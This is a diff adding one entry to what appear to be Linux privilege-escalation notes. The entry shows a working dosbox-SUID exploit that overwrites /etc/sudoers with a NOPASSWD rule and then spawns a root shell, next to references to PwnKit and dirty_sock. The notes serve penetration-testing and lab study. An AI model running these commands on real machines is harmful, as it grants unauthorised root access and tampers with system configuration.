@@ -83,6 +83,13 @@ flowchart TD
 | pkexec | version 0.105 → PwnKit (CVE-2021-4034) |
 | snap-confine | snapd < 2.37.1 → dirty_sock (CVE-2019-7304) |
 
+**Binary is `dosbox` (not in GTFOBins)?**
+→ DOS emulator with SUID root = root file-write primitive
+→ `dosbox -c 'mount c /etc' -c 'echo $Username ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'`
+→ Then `sudo -n bash`
+→ Cleanup: restore `/etc/sudoers` from the package-manager cache
+→ See [[Linux Privilege Escalation#DOSBox SUID → Sudoers Write (non-GTFOBins pattern)|Command Appendix]], [[PrivEsc Linux - SUID]]
+
 ---
 
 ## Cron job: is the script exploitable?
